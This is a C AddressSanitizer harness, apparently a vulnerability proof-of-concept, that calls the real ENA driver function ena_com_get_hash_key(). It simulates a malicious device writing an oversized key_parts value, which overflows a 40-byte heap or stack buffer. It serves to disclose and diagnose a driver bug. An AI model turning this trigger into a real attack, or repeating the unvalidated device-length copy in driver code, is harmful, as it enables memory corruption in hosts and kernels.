/* ASAN harness for F3: ena_com_get_hash_key() trusts the device-written
 * key_parts.  Calls the REAL amzn-drivers DPDK ena_com.c function.
 *
 * In the driver, ena_com_get_hash_function() issues
 * GET_FEATURE(RSS_HASH_FUNCTION) with rss->hash_key (a DMA-coherent buffer)
 * as the control buffer, so the device writes the whole struct including
 * key_parts.  Here we simulate that single device write and then make the
 * real call.  Destination size mirrors the drivers' callers:
 *   Linux  ethtool rxfh->key, ENA_HASH_KEY_SIZE = 40 (heap)
 *   DPDK   uint8_t hw_rss_key[ENA_HASH_KEY_SIZE] (stack)
 *   FreeBSD u8 hw_key[ENA_HASH_KEY_SIZE] (kernel stack)
 */
#include "ena_com.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ENA_HASH_KEY_SIZE 40

int main(int argc, char **argv)
{
  struct ena_com_dev ena_dev;
  struct ena_admin_feature_rss_flow_hash_control *hash_key;
  unsigned char *key;
  int stack_mode = (argc > 1 && !strcmp(argv[1], "stack"));

  memset(&ena_dev, 0, sizeof(ena_dev));

  /* the DMA-coherent buffer the device writes (ena_com.c:1114 sets
	 * key_parts = ENA_ADMIN_RSS_KEY_PARTS at init) */
  /* spacers so the DMA buffer and the destination are not adjacent,
	 * otherwise ASAN reports the overlap instead of the overflow */
  void *spacer[8];
  for(int i = 0; i < 8; i++)
    spacer[i] = malloc(4096);
  /* dma_alloc_coherent() hands out page-granular memory, so a 256-byte
	 * read of it does not fault in the kernel; model that with a page. */
  hash_key = malloc(4096);
  memset(hash_key, 0xab, 4096);
  hash_key->key_parts = ENA_ADMIN_RSS_KEY_PARTS;
  ena_dev.rss.hash_key = hash_key;

  printf(
    "sizeof(hash_key struct) = %zu, key[] = %zu bytes, "
    "ENA_ADMIN_RSS_KEY_PARTS = %d\n",
    sizeof(*hash_key),
    sizeof(hash_key->key),
    (int)ENA_ADMIN_RSS_KEY_PARTS);

  /* --- a malicious/buggy device writes key_parts in the GET_FEATURE
	 *     response (u32 field, no driver validation) --- */
  hash_key->key_parts = 0x40;
  printf(
    "device set key_parts = 0x%x -> memcpy length = %zu into a "
    "%d-byte buffer\n",
    hash_key->key_parts,
    (size_t)hash_key->key_parts * sizeof(hash_key->key[0]),
    ENA_HASH_KEY_SIZE);
  fflush(stdout);

  if(stack_mode)
  {
    unsigned char hw_key[ENA_HASH_KEY_SIZE]; /* DPDK / FreeBSD */
    ena_com_get_hash_key(&ena_dev, hw_key);
    printf("stack: survived, key[0]=%u\n", hw_key[0]);
  }
  else
  {
    for(int i = 0; i < 8; i++)
      free(spacer[i]);
    key = malloc(ENA_HASH_KEY_SIZE); /* Linux ethtool */
    ena_com_get_hash_key(&ena_dev, key);
    printf("heap: survived, key[0]=%u\n", key[0]);
  }
  return 0;
}
